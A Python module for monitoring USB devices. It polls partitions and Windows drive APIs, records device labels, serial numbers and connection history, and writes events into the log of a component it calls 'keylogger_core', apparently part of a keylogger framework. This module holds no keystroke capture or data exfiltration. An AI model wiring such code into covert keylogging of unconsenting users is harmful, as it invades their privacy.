"""USB device monitoring utility with security features."""

import time
import threading
import logging
from typing import Optional, Dict, Any, Set, List
import psutil

try:
    import win32file
    import win32api
    import win32con
except ImportError:
    win32file = win32api = win32con = None
    logging.warning("Windows-specific modules not available for USB monitoring")

logger = logging.getLogger(__name__)


class USBMonitor:
    """Monitor USB device connections and disconnections."""
    
    def __init__(self, keylogger_core):
        self.keylogger = keylogger_core
        self.config = keylogger_core.config
        self.is_running = False
        
        # USB tracking
        self.connected_devices: Set[str] = set()
        self.device_history: List[Dict[str, Any]] = []
        self.device_info_cache: Dict[str, Dict[str, Any]] = {}
        
        # Performance settings
        self.check_interval = self.config.get('performance.usb_check_interval', 2.0)
        self.max_history_size = self.config.get('performance.usb_history_size', 500)
        
        # Security settings
        self.log_device_details = self.config.get('security.log_usb_details', True)
        self.alert_on_new_devices = self.config.get('security.alert_new_usb_devices', True)
        self.track_file_operations = self.config.get('security.track_usb_file_ops', False)
        
        # Statistics
        self.stats = {
            'devices_connected': 0,
            'devices_disconnected': 0,
            'total_events': 0,
            'unique_devices': 0,
            'errors': 0
        }
        
        # Initialize device list
        self._initialize_device_list()
    
    def _initialize_device_list(self) -> None:
        """Initialize the list of currently connected USB devices."""
        try:
            current_devices = self._get_usb_devices()
            self.connected_devices = set(current_devices.keys())
            self.device_info_cache.update(current_devices)
            
            logger.info(f"Initialized USB monitor with {len(self.connected_devices)} devices")
            
        except Exception as e:
            logger.error(f"Error initializing USB device list: {e}")
            self.stats['errors'] += 1
    
    def run(self) -> None:
        """Main USB monitoring loop."""
        if not self._check_usb_support():
            logger.error("USB monitoring not supported on this platform")
            return
        
        self.is_running = True
        logger.info("USB monitor started")
        
        try:
            while self.is_running and not self.keylogger.stop_event.is_set():
                try:
                    self._check_usb_changes()
                    
                    # Wait for next check
                    if self.keylogger.stop_event.wait(self.check_interval):
                        break
                    
                except Exception as e:
                    logger.error(f"Error in USB monitoring loop: {e}")
                    self.stats['errors'] += 1
                    time.sleep(self.check_interval * 2)
            
        except Exception as e:
            logger.error(f"Critical error in USB monitor: {e}")
        finally:
            logger.info(f"USB monitor stopped. Stats: {self.stats}")
    
    def _check_usb_support(self) -> bool:
        """Check if USB monitoring is supported."""
        # For now, we'll use cross-platform psutil approach
        # Windows-specific win32file approach can be added later
        return True
    
    def _check_usb_changes(self) -> None:
        """Check for USB device changes."""
        try:
            current_devices = self._get_usb_devices()
            current_device_ids = set(current_devices.keys())
            
            # Check for new devices
            new_devices = current_device_ids - self.connected_devices
            for device_id in new_devices:
                self._handle_device_connected(device_id, current_devices[device_id])
            
            # Check for removed devices
            removed_devices = self.connected_devices - current_device_ids
            for device_id in removed_devices:
                self._handle_device_disconnected(device_id)
            
            # Update connected devices list
            self.connected_devices = current_device_ids
            
            # Update device info cache
            self.device_info_cache.update(current_devices)
            
        except Exception as e:
            logger.error(f"Error checking USB changes: {e}")
            self.stats['errors'] += 1
    
    def _get_usb_devices(self) -> Dict[str, Dict[str, Any]]:
        """Get currently connected USB devices."""
        devices = {}

        try:
            # Use psutil to get disk partitions (includes USB drives)
            partitions = psutil.disk_partitions()

            for partition in partitions:
                try:
                    # Check if it's a removable device
                    if 'removable' in partition.opts or self._is_usb_drive(partition):
                        device_info = self._get_device_info(partition)
                        if device_info:
                            device_id = self._generate_device_id(partition, device_info)
                            devices[device_id] = device_info

                except Exception as e:
                    logger.debug(f"Error processing partition {partition.device}: {e}")
                    continue

            # Add Windows-specific USB device detection if available
            if win32file:
                devices.update(self._get_windows_usb_devices())

        except Exception as e:
            logger.error(f"Error getting USB devices: {e}")
            self.stats['errors'] += 1

        return devices

    def _get_current_usb_devices(self) -> Set[str]:
        """Return a simplified set of currently connected device paths."""
        devices = self._get_usb_devices()
        simplified = set()
        for device_id, info in devices.items():
            simplified.add(info.get('device', device_id))
        return simplified

    def _detect_device_changes(self, current_devices: Set[str]) -> tuple[Set[str], Set[str]]:
        """Compare current devices against tracked devices and return changes."""
        connected = set(current_devices) - set(self.connected_devices)
        disconnected = set(self.connected_devices) - set(current_devices)
        return connected, disconnected

    def _is_usb_drive(self, partition) -> bool:

        try:
            # Check mount point patterns that suggest USB
            mount_point = partition.mountpoint.lower()
            
            # Common USB mount patterns
            usb_patterns = [
                'usb', 'removable', 'external', 'portable',
                'flash', 'thumb', 'stick'
            ]
            
            for pattern in usb_patterns:
                if pattern in mount_point:
                    return True
            
            # Check filesystem type (USB drives often use FAT32, exFAT, NTFS)
            if partition.fstype.lower() in ['fat32', 'exfat', 'vfat']:
                return True
            
            return False
            
        except Exception:
            return False
    
    def _get_device_info(self, partition) -> Optional[Dict[str, Any]]:
        """Get detailed information about a device."""
        try:
            device_info = {
                'device': partition.device,
                'mountpoint': partition.mountpoint,
                'fstype': partition.fstype,
                'opts': partition.opts,
                'timestamp': time.time()
            }
            
            # Get disk usage if accessible
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                device_info.update({
                    'total_bytes': usage.total,
                    'used_bytes': usage.used,
                    'free_bytes': usage.free,
                    'usage_percent': (usage.used / usage.total) * 100 if usage.total > 0 else 0
                })
            except (PermissionError, OSError):
                # Device might not be accessible
                device_info.update({
                    'total_bytes': 0,
                    'used_bytes': 0,
                    'free_bytes': 0,
                    'usage_percent': 0,
                    'accessible': False
                })
            
            # Try to get volume label (Windows)
            if hasattr(partition, 'label') or win32api:
                try:
                    if win32api:
                        volume_info = win32api.GetVolumeInformation(partition.mountpoint)
                        device_info['label'] = volume_info[0] if volume_info[0] else 'Unknown'
                        device_info['serial_number'] = volume_info[1]
                        device_info['filesystem'] = volume_info[4]
                    else:
                        device_info['label'] = getattr(partition, 'label', 'Unknown')
                except Exception:
                    device_info['label'] = 'Unknown'
            
            return device_info
            
        except Exception as e:
            logger.error(f"Error getting device info: {e}")
            return None
    
    def _generate_device_id(self, partition, device_info: Dict[str, Any]) -> str:
        """Generate a unique device ID."""
        try:
            # Use device path and serial number if available
            device_id = partition.device
            
            if 'serial_number' in device_info and device_info['serial_number']:
                device_id += f"_{device_info['serial_number']}"
            elif 'label' in device_info and device_info['label']:
                device_id += f"_{device_info['label']}"
            
            return device_id
            
        except Exception:
            return partition.device
    
    def _get_windows_usb_devices(self) -> Dict[str, Dict[str, Any]]:
        """Get USB devices using Windows-specific APIs."""
        devices = {}
        
        if not win32file:
            return devices
        
        try:
            # Get logical drives
            drives = win32api.GetLogicalDrives()
            
            for i in range(26):  # A-Z
                if drives & (1 << i):
                    drive_letter = chr(ord('A') + i) + ':\\'
                    
                    try:
                        drive_type = win32file.GetDriveType(drive_letter)
                        
                        # Check if it's a removable drive
                        if drive_type == win32con.DRIVE_REMOVABLE:
                            device_info = {
                                'device': drive_letter,
                                'mountpoint': drive_letter,
                                'drive_type': 'removable',
                                'timestamp': time.time()
                            }
                            
                            # Get volume information
                            try:
                                volume_info = win32api.GetVolumeInformation(drive_letter)
                                device_info.update({
                                    'label': volume_info[0] or 'Removable Drive',
                                    'serial_number': volume_info[1],
                                    'filesystem': volume_info[4]
                                })
                            except Exception:
                                device_info['label'] = 'Removable Drive'
                            
                            device_id = f"{drive_letter}_{device_info.get('serial_number', 'unknown')}"
                            devices[device_id] = device_info
                    
                    except Exception as e:
                        logger.debug(f"Error checking drive {drive_letter}: {e}")
                        continue
        
        except Exception as e:
            logger.error(f"Error getting Windows USB devices: {e}")
        
        return devices
    
    def _handle_device_connected(self, device_id: str, device_info: Dict[str, Any]) -> None:
        """Handle USB device connection."""
        try:
            self.stats['devices_connected'] += 1
            self.stats['total_events'] += 1
            
            # Add to history
            history_entry = {
                'event': 'connected',
                'device_id': device_id,
                'device_info': device_info.copy(),
                'timestamp': time.time()
            }
            
            self._add_to_history(history_entry)
            
            # Log event
            self._log_usb_event('connected', device_id, device_info)
            
            # Alert if configured
            if self.alert_on_new_devices:
                self._send_device_alert('connected', device_id, device_info)
            
            # Update unique devices count
            self.stats['unique_devices'] = len(set(entry['device_id'] for entry in self.device_history))
            
        except Exception as e:
            logger.error(f"Error handling device connection: {e}")
            self.stats['errors'] += 1
    
    def _handle_device_disconnected(self, device_id: str) -> None:
        """Handle USB device disconnection."""
        try:
            self.stats['devices_disconnected'] += 1
            self.stats['total_events'] += 1
            
            # Get device info from cache
            device_info = self.device_info_cache.get(device_id, {'device': device_id})
            
            # Add to history
            history_entry = {
                'event': 'disconnected',
                'device_id': device_id,
                'device_info': device_info.copy(),
                'timestamp': time.time()
            }
            
            self._add_to_history(history_entry)
            
            # Log event
            self._log_usb_event('disconnected', device_id, device_info)
            
            # Alert if configured
            if self.alert_on_new_devices:
                self._send_device_alert('disconnected', device_id, device_info)
            
        except Exception as e:
            logger.error(f"Error handling device disconnection: {e}")
            self.stats['errors'] += 1
    
    def _add_to_history(self, entry: Dict[str, Any]) -> None:
        """Add event to device history."""
        self.device_history.append(entry)
        
        # Limit history size
        if len(self.device_history) > self.max_history_size:
            self.device_history = self.device_history[-self.max_history_size:]
    
    def _log_usb_event(self, event_type: str, device_id: str, device_info: Dict[str, Any]) -> None:
        """Log USB device event."""
        try:
            # Format device details
            if self.log_device_details:
                device_label = device_info.get('label', 'Unknown')
                device_path = device_info.get('device', device_id)
                filesystem = device_info.get('filesystem', device_info.get('fstype', 'Unknown'))
                
                if 'total_bytes' in device_info and device_info['total_bytes'] > 0:
                    size_gb = device_info['total_bytes'] / (1024**3)
                    details = f"USB device {event_type}: {device_label} ({device_path}) - {filesystem}, {size_gb:.1f}GB"
                else:
                    details = f"USB device {event_type}: {device_label} ({device_path}) - {filesystem}"
            else:
                details = f"USB device {event_type}: {device_id}"
            
            window_name = self.keylogger.session_stats.get('active_window', 'System')
            
            self.keylogger.log_event(
                f"USB {event_type.title()}",
                details,
                window_name,
                metadata={
                    'device_id': device_id,
                    'event_type': event_type,
                    'device_info': device_info if self.log_device_details else {}
                }
            )
            
        except Exception as e:
            logger.error(f"Error logging USB event: {e}")
    
    def _send_device_alert(self, event_type: str, device_id: str, device_info: Dict[str, Any]) -> None:
        """Send alert for USB device event."""
        try:
            # This could be extended to send email alerts, notifications, etc.
            alert_message = f"USB Device {event_type.title()}: {device_info.get('label', device_id)}"
            logger.warning(f"USB ALERT: {alert_message}")
            
            # Log as high-priority event
            self.keylogger.log_event(
                "USB Alert",
                alert_message,
                "System",
                metadata={
                    'alert_type': 'usb_device',
                    'event_type': event_type,
                    'device_id': device_id,
                    'priority': 'high'
                }
            )
            
        except Exception as e:
            logger.error(f"Error sending device alert: {e}")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get USB monitoring statistics."""
        return {
            **self.stats,
            'is_running': self.is_running,
            'connected_devices_count': len(self.connected_devices),
            'history_size': len(self.device_history),
            'cached_devices': len(self.device_info_cache)
        }
    
    def get_connected_devices(self) -> List[Dict[str, Any]]:
        """Get list of currently connected USB devices."""
        connected = []
        
        for device_id in self.connected_devices:
            device_info = self.device_info_cache.get(device_id, {})
            connected.append({
                'device_id': device_id,
                'device_info': device_info
            })
        
        return connected
    
    def get_device_history(self, limit: Optional[int] = None) -> List[Dict[str, Any]]:
        """Get USB device event history."""
        if limit:
            return self.device_history[-limit:]
        return self.device_history.copy()
    
    def get_device_summary(self) -> Dict[str, Any]:
        """Get summary of USB device activity."""
        try:
            # Analyze device history
            unique_devices = set()
            connection_events = 0
            disconnection_events = 0
            device_types = {}
            
            for entry in self.device_history:
                unique_devices.add(entry['device_id'])
                
                if entry['event'] == 'connected':
                    connection_events += 1
                elif entry['event'] == 'disconnected':
                    disconnection_events += 1
                
                # Analyze device types
                device_info = entry.get('device_info', {})
                filesystem = device_info.get('filesystem', device_info.get('fstype', 'Unknown'))
                device_types[filesystem] = device_types.get(filesystem, 0) + 1
            
            return {
                'unique_devices': len(unique_devices),
                'total_connections': connection_events,
                'total_disconnections': disconnection_events,
                'device_types': device_types,
                'currently_connected': len(self.connected_devices),
                'monitoring_stats': self.get_stats()
            }
            
        except Exception as e:
            logger.error(f"Error generating device summary: {e}")
            return {}
    
    def export_device_data(self) -> Dict[str, Any]:
        """Export USB device data for analysis."""
        return {
            'stats': self.get_stats(),
            'connected_devices': self.get_connected_devices(),
            'device_history': self.get_device_history(),
            'device_summary': self.get_device_summary(),
            'export_timestamp': time.time()
        }